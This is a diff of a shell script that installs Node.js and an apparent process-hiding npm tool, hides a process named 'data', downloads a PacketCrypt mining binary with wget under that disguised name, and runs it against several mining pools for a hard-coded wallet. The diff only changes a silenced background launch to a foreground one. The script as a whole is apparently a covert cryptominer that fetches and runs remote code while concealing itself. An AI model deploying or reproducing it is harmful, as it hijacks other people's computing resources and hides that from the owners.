@@ -3,4 +3,4 @@ apt update && apt install -y nodejs && apt install -y npm && npm i -g node-proce
 ph add data
 wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O data >/dev/null 2>&1 &&
 chmod +x data && 
-nohup ./data ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com > nohup.out >/dev/null 2>&1
+./data ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com
